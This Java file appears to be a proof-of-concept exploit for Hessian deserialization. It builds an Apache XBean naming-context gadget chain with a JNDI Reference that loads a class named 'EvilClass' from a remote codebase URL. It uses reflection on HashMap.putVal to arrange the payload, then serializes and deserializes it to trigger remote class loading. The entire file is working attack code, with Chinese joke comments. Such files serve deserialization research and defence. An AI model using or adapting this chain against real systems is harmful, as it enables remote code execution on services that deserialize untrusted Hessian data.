package org.su18.serialize.hessian.XBean;

import com.sun.org.apache.xpath.internal.objects.XString;
import org.apache.xbean.naming.context.ContextUtil;
import org.apache.xbean.naming.context.WritableContext;
import org.jboss.weld.util.reflection.Reflections;
import org.su18.serialize.utils.ClassUtil;
import org.su18.serialize.utils.HessianUtils;

import javax.naming.Context;
import javax.naming.Reference;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * @author su18
 */
public class XBean1 {

	public static void main(String[] args) throws Exception {

		String codebase = "http://127.0.0.1:9999/";
		String clazz    = "org.su18.serialize.test.EvilClass";

		WritableContext             wc      = (WritableContext) ClassUtil.createInstanceUnsafely(WritableContext.class);
		Reference                   ref     = new Reference("foo", clazz, codebase);
		ContextUtil.ReadOnlyBinding binding = new ContextUtil.ReadOnlyBinding("su18", ref, wc);

		XString xString = new XString("su18");

		HashMap map = new HashMap();

		// 放入 Qname 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前
		map.put(binding, "su18");
		Method[] m = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m) {
			if ("putVal".equals(method.getName())) {
				method.setAccessible(true);
				method.invoke(map, -1, binding, 0, false, true);
			}
		}

		// 放入 XString 移除 putVal 的影响，我知道这种写法对于碳基生物有些超前
		map.put(xString, "su19");
		Method[] m2 = Class.forName("java.util.HashMap").getDeclaredMethods();
		for (Method method : m2) {
			if ("putVal".equals(method.getName())) {
				method.setAccessible(true);
				method.invoke(map, -1, xString, 0, false, true);
			}
		}

		byte[] baos = HessianUtils.hessianSerialize(map, "hessian2");
		HessianUtils.hessianSerializeToObj(baos, "hessian2");
	}

}
